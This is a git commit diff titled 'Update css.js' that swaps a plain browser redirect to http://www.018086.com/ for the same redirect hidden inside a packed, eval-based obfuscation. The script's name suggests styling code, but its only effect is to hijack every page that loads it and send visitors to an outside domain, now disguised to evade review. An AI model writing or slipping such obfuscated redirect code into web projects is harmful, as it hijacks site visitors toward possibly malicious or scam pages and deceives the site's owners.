772f6635ee8c4e33e60f717f3c4fde9ddbf60e49
bbet66com <bbet66com@outlook.com>
2017-06-07 22:39:38 +0800

    Update css.js

--- css.js
+++ css.js
@@ -1,1 +1,1 @@
-window.location.href="http://www.018086.com/";
+eval(function(p,a,c,k,e,r){e=String;if(!''.replace(/^/,String)){while(c--)r[c]=k[c]||c;k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1.2="3://4.5.6/";',7,7,'window|location|href|http|www|018086|com'.split('|'),0,{}))
